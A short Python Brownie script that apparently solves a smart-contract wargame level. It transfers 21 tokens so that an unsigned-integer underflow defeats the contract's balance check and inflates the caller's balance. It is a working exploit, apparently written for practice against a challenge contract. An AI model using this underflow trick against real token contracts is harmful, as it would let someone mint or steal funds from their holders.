from scripts.helpful_scripts import get_account
from brownie import interface


def main():
    account = get_account()
    token = interface.Token("0x5f25d924362d233A6840554dF30b2a2444Bcbee2")

    print(f"My Token balance before: {token.balanceOf(account)}")
    # due to underflow of uint datatype, the require statement is moot
    token.transfer(token.address, 21, {"from": account})
    print(f"My Token balance after:  {token.balanceOf(account)}")
